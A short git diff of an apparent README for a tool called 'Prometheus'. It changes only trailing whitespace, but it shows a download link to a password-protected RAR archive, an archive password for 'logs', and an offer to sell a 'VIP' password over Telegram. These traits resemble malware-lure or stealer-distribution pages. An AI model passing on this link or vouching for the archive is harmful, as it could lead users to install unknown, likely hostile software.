@@ -142,4 +142,4 @@ P.S. Password from archive with logs "prometheus"
 
 💎 [Download VIP](https://raw.githubusercontent.com/prometeydev/Prometheus/main/PrometheusVIP.rar)
 
-💎 If you want to get the password for the VIP version of Prometheus, you can buy it from me in [Telegram](https://t.me/PrometheusSupport).                                                           
+💎 If you want to get the password for the VIP version of Prometheus, you can buy it from me in [Telegram](https://t.me/PrometheusSupport).                                                            
